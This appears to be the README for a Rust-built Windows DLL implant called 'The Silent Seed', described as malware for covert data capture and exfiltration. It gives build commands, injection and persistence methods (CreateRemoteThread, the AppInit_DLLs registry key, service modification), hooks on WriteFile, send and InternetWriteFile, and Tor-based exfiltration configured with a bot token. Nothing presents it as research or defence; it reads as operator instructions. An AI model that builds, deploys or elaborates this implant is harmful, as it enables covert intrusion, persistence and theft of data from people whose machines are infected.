# Component A: The Silent Seed (Windows)

Windows DLL-based in-memory implant for passive data capture and exfiltration.

## Building

```bash
# Build as Windows DLL
cargo build --release --target x86_64-pc-windows-msvc

# Or for 32-bit
cargo build --release --target i686-pc-windows-msvc
```

## Implantation Methods

### Method 1: DLL Injection
```powershell
# Using SetWindowsHookEx or CreateRemoteThread
# Inject protosyte.dll into target process
```

### Method 2: AppInit_DLLs (Registry)
```powershell
# Add to registry (requires admin):
# HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Windows
# AppInit_DLLs = "C:\Windows\System32\protosyte.dll"
```

### Method 3: Service Modification
```powershell
# Modify Windows service to load DLL
# Edit service registry or use sc.exe
```

## Windows-Specific Features

- Uses Windows shared memory (CreateFileMapping)
- Hooks Windows API (WriteFile, send, InternetWriteFile)
- Integrates with Windows services
- Supports Tor Browser (port 9150) and Tor service (port 9050)

## Configuration

Bot token and endpoints via environment variables:
- `PROTOSYTE_BOT_TOKEN`
- `PROTOSYTE_PASSPHRASE`

## Requirements

- Windows 7+ (x86_64 or i686)
- Tor running (Tor Browser or Tor service)
- Appropriate privileges for DLL injection

